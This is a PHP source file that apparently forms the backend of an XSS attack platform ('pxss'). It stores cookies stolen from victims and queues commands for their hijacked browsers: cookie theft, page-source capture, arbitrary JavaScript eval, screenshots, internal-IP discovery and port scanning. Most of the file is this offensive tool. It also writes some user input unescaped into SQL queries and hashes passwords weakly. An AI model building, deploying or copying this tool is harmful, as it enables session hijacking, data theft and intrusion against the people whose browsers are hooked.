<?php

/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.11 10:43
 */

class user_control
{
  
    function xss_info($ip,$domain)
    {
        $safeip = htmlspecialchars(addslashes($ip));
        $safedomain = htmlspecialchars(addslashes($domain));
        if ($ip && $domain && $ip != '' && $domain != '')
            //&& ereg("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",$ip) 判断是否是IP
            {
            $xss_query = mysql_query("SELECT * FROM `pxss_cookie` WHERE `cookie_ip`='{$safeip}' AND `cookie_domain`='{$safedomain}'") or
                die("error: " . mysql_error());
            $xss_res = mysql_fetch_array($xss_query);
            return $xss_res;
        }

    }
    function user_info()
    {
        $user_query = mysql_query("SELECT * FROM `pxss_users` WHERE `username`='{$_SESSION['user_name']}'") or
            die("error: " . mysql_error());
        $user_res = mysql_fetch_array($user_query);
        return $user_res;
    }
    // escape
    
    function escape($string, $in_encoding = 'UTF-8',$out_encoding = 'UCS-2') { 
    $return = ''; 
    if (function_exists('mb_get_info')) { 
        for($x = 0; $x < mb_strlen ( $string, $in_encoding ); $x ++) { 
            $str = mb_substr ( $string, $x, 1, $in_encoding ); 
            if (strlen ( $str ) > 1) {
                $return .= '%u' . strtoupper ( bin2hex ( mb_convert_encoding ( $str, $out_encoding, $in_encoding ) ) ); 
            } else { 
                $return .= '%' . strtoupper ( bin2hex ( $str ) ); 
            } 
        } 
    } 
    return $return; 
}
//其它的多功能选项
    function other_tools()
    {
        
        $ip = htmlspecialchars(addslashes($_POST['ip']));
        $domain = htmlspecialchars(addslashes($_POST['domain']));
        $cmd = htmlspecialchars(addslashes($_POST['cmd']));
        $alert=htmlspecialchars(addslashes($_POST['alert']));
        $ipaddress=htmlspecialchars(addslashes($_POST['ipaddress']));
        $ipport=htmlspecialchars(addslashes($_POST['ipport']));
        $eval=$this->escape($_POST['eval']);
        $alert_res='';
        if($cmd=='alert' && $alert!='' )
        {
            $alert_res=$alert;
        }else if($cmd=='eval' && $eval!='')
        {
            $alert_res=$eval;
        }else if($cmd=='portscan' && $ipaddress!='' && $ipport!='')
        {
            $alert_res=$ipaddress.'|'.$ipport;
        }else if($cmd=='geturlhtml' && $alert!='')
        {
            $alert_res=$alert;
        }
        else
        {
            $alert_res='NULL';
        }
       
        if($ip && $ip!='' && $domain && $domain!='' && $cmd && $cmd!='')
        {
            
            $cmd_type='';
            
            $thetime = gmdate('Y-m-d H:i:s', time() + 3600 * 8);
           $xss_res= $this->xss_info($_POST['ip'],$_POST['domain']);

            if(is_array($xss_res))
            {
              switch($cmd)
                {
                case "getcookie":$cmd_type='1';
                echo <<< EOD
{
	"statusCode":"200",
	"message":"getcookie\u547D\u4EE4\u5DF2\u53D1\u51FA",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "gethtml":$cmd_type='2';
                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u83B7\u53D6\u6E90\u7801\u547D\u4EE4\u5DF2\u53D1\u51FA",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "alert":$cmd_type='3';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u5F39\u7A97\u547D\u4EE4\u5DF2\u53D1\u51FA",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "eval":$cmd_type='4';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u8981\u6267\u884C\u7684JS\u5DF2\u53D1\u9001",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "pic":$cmd_type='5';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u622A\u5C4F\u547D\u4EE4\u5DF2\u53D1\u9001,\u7A0D\u540E\u5237\u65B0\u67E5\u770B",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "getnetworkip":$cmd_type='6';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u83B7\u53D6\u5185\u7F51IP\u547D\u4EE4\u5DF2\u53D1\u9001,\u7A0D\u540E\u5237\u65B0\u67E5\u770B",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "portscan":$cmd_type='7';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u7AEF\u53E3\u626B\u63CF\u547D\u4EE4\u5DF2\u53D1\u9001,\u7A0D\u540E\u5237\u65B0\u67E5\u770B",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                case "geturlhtml":$cmd_type='8';
                                                echo <<< EOD
{
	"statusCode":"200",
	"message":"\u83B7\u53D6\u7F51\u9875\u6E90\u7801\u547D\u4EE4\u5DF2\u53D1\u9001,\u7A0D\u540E\u5237\u65B0\u67E5\u770B",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                break;
                
                }
                if($cmd_type==7){ //如果是端口扫描就先在res随便插个字符
                 mysql_query("INSERT INTO `pxss_cmd` (`id`, `domain`,`ip`,`cmd`,`connect`, `res`,`datetime`) VALUES (NULL,'{$domain}','{$ip}', '{$cmd_type}','{$alert_res}', '>>>', '{$thetime}')");
          }else{
            mysql_query("INSERT INTO `pxss_cmd` (`id`, `domain`,`ip`,`cmd`,`connect`, `res`,`datetime`) VALUES (NULL,'{$domain}','{$ip}', '{$cmd_type}','{$alert_res}', NULL, '{$thetime}')");
          
          }
          }
            else
            {
echo <<< EOD
{
	"statusCode":"300",
	"message":"\u8BF7\u52FF\u975E\u6CD5\u64CD\u4F5C",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
          }
        }
        else{
            echo <<< EOD
{
	"statusCode":"300",
	"message":"\u8BF7\u52FF\u975E\u6CD5\u64CD\u4F5C",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
        }
        
    }
    function project_del()
    {
        $id = htmlspecialchars(addslashes($_POST['id']));
        if ($id && $id != '') {
            $id_arr = explode(",", $id);
            foreach ($id_arr as $idval) {
                if (is_numeric($idval)) {
                    $id_query = mysql_query("SELECT * FROM `pxss_project` WHERE `pid`='{$idval}'");
                    if (is_array($id_res = mysql_fetch_array($id_query))) {
                                mysql_query("DELETE FROM `pxss_project` WHERE `pid` = '{$idval}'");
                                mysql_query("DELETE FROM `pxss_cookie` WHERE `cookie_domain`='{$id_res['project_domain']}' AND `cookie_ip`='{$id_res['project_ip']}'");
                                echo "<script language=\"javascript\" type=\"text/javascript\">alert(\"删除成功\");window.location.href=\"index.php\";</script>";

                           
                       

                    } else {
                        echo "<script language=\"javascript\" type=\"text/javascript\">alert(\"id不存在\");window.location.href=\"index.php\";</script>";


                    }
                }
            }
        }
    }

    function user_change()//更改用户信息
    {
        if($_POST['newPassword']){
        if ($_POST['newPassword'] && $_POST['rnewPassword'] && $_POST['newPassword'] ==
            $_POST['rnewPassword']) {
            if (strlen($_POST['newPassword']) > 7) {
                if($_POST['newPassword']!=$_POST['oldPassword']){
                    $oldpass=md5(sha1(md5(base64_decode(md5($_POST['oldPassword'])))));
                   $datapass= mysql_query("SELECT `password` FROM `pxss_users` WHERE `username`='{$_SESSION["user_name"]}'");
                   $datapass_res=mysql_fetch_array($datapass);
                   if($oldpass==$datapass_res['password']){
                        $newpass=md5(sha1(md5(base64_decode(md5($_POST['newPassword'])))));
                        mysql_query("UPDATE `pxss_users` SET `password`='{$newpass}' WHERE `uid`='{$datapass_res['uid']}'");
echo <<< EOD
{
	"statusCode":"200",
	"message":"\u66F4\u65B0\u6210\u529F,\u4E0B\u6B21\u767B\u5F55\u751F\u6548!",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                }else{
echo <<< EOD
{
	"statusCode":"300",
	"message":"\u539F\u5BC6\u7801\u4E0D\u6B63\u786E!",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                   }
                }else{
echo <<< EOD
{
	"statusCode":"300",
	"message":"\u4E0E\u539F\u5BC6\u7801\u76F8\u540C!",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
                }

            } else {
echo <<< EOD
{
	"statusCode":"300",
	"message":"\u5BC6\u7801\u957F\u5EA6\u5C0F\u4E8E8\u4F4D",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
            }
        }else{
echo <<< EOD
{
	"statusCode":"300",
	"message":"\u4E24\u6B21\u5BC6\u7801\u4E0D\u4E00\u81F4",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
    }}else{
    if($_POST['emailname'] && $_POST['emailname']!='' ){
        $email=$_POST['emailname'];
        if($ereg=eregi("^[_\.0-9a-z-]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,3}$",$email)){
            mysql_query("UPDATE `pxss_users` SET `email`='{$email}' WHERE `username`='{$_SESSION["user_name"]}'");
        echo <<< EOD
{
	"statusCode":"200",
	"message":"\u66F4\u65B0\u6210\u529F!",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;

        }else{
        echo <<< EOD
{
	"statusCode":"300",
	"message":"\u90AE\u7BB1\u683C\u5F0F\u4E0D\u6B63\u786E",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
   
        }
        
    }else{
        echo <<< EOD
{
	"statusCode":"300",
	"message":"\u90AE\u7BB1\u4E0D\u80FD\u4E3A\u7A7A",
	"navTabId":"",
	"callbackType":"",
	"forwardUrl":""
}

EOD;
    }}
    }//user_changge
    


}
?>